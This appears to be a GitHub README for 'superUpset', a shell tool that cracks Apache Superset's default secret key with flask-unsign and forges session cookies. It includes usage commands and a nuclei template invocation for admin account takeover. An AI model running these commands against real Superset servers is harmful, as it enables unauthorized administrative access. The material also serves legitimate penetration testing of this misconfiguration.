# superUpset
This is a tool focused in exploit the default session configuration of Superset, that is Flask-based, and it depends on the another tool called flask-unsign (https://github.com/Paradoxis/Flask-Unsign) to proceed with the cracking SUPERSET_SECRET_KEY and the signing of a valid session cookie after that.

### Usage

* Craking cookie:

`./superUpset.sh http://<IP_ADDRESS>:<PORT> <WORDLIST> --crack`

<img width="929" height="351" alt="image" src="https://github.com/user-attachments/assets/af7b42ab-4545-42a3-9bea-3f4673acfa91" />


* Sign new valid cookie:

`./superUpset.sh http://<IP_ADDRESS>:<PORT> <WORDLIST> --sign`

<img width="1850" height="397" alt="image" src="https://github.com/user-attachments/assets/8a8ba22a-742a-4691-9b5a-2f94b1485b86" />


* Proceed with all steps:

`./superUpset.sh http://<IP_ADDRESS>:<PORT> <WORDLIST> --all`

<img width="1845" height="592" alt="image" src="https://github.com/user-attachments/assets/dc119f47-7098-42d0-81dd-bba08bebecd0" />

* Nuclei template:

`./superUpset.sh`

`~/go/bin/nuclei -t template-apache-superset-adminaccounttakeover.yaml -u "http://<IP_ADDRESS>:<PORT>" -H "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" -V token=/root/nuclei-templates/helpers/payloads//defaultSupersetSecretKeySessionCookie.txt`

<img width="1853" height="902" alt="image" src="https://github.com/user-attachments/assets/a368f01d-07e1-4fd3-82dc-39c79dfd9b66" />

